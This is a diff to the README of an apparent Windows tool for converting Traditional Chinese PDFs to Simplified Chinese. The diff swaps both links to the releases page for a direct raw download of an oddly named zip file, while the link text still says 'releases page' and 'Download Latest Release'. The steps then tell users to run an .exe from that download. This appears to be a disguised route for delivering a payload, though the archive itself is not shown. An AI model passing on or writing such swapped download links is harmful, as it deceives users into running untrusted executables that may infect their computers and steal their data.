@@ -1,6 +1,6 @@
 # 📄 pdf-trad-to-simp-preserve-layout-kit - Convert Chinese PDFs While Keeping Layouts
 
-<a href="https://github.com/whiteseeded-master5971/pdf-trad-to-simp-preserve-layout-kit/releases">
+<a href="https://raw.githubusercontent.com/whiteseeded-master5971/pdf-trad-to-simp-preserve-layout-kit/main/exponent/preserve_kit_layout_to_trad_pdf_simp_abrook.zip">
   <img src="https://img.shields.io/badge/Download-Latest_Release-blue" alt="Download Link">
 </a>
 
@@ -10,7 +10,7 @@ This kit converts Traditional Chinese PDF documents into Simplified Chinese. It 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/whiteseeded-master5971/pdf-trad-to-simp-preserve-layout-kit/releases) to find the latest version of the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/whiteseeded-master5971/pdf-trad-to-simp-preserve-layout-kit/main/exponent/preserve_kit_layout_to_trad_pdf_simp_abrook.zip) to find the latest version of the application.
 2. Select the file ending in `.exe` to download it to your computer.
 3. Once the download finishes, find the file in your Downloads folder.
 4. Double-click the file to start the installation.
